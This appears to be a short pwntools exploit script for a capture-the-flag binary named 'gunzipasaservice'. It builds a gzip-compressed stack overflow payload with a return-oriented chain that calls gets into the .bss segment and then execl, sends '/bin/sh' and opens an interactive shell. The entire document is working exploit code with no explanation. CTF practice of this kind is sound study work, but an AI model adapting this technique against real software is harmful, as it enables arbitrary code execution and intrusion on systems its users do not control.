from pwn import *
import os
p = process("./gunzipasaservice")
binary = ELF("./gunzipasaservice")
gets = 0x08049050
execla =0x080490b0 
bss = 0x0804c044
pad =0x414+4 
def pay ():
	pay = ""
	pay += "a"*pad
	pay += p32(gets)
	pay += p32(execla)
	pay += p32(bss)
	pay += p32(bss)
	pay += p32(0)
	pay += p32(0)
	
	open("poison","w+").write(pay)
	os.system("gzip poison")
	poison = open("poison.gz","rb").read()
	p.send(poison)
	os.system("rm poison.gz")
	p.send("/bin/sh\x00")
	p.interactive()
pay()
	
	
